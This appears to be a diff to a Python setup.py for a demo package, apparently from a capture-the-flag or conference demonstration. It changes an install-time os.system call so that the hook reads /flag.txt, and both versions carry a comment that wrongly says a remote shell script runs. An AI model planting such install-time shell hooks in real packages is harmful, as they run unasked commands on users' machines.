@@ -1,7 +1,7 @@
 from setuptools import setup
 import os
 
-os.system("touch /tmp/test")  # Executes remote shell script
+os.system("cat /flag.txt")  # Executes remote shell script
 
 setup(
     name="rsac-demo-package",
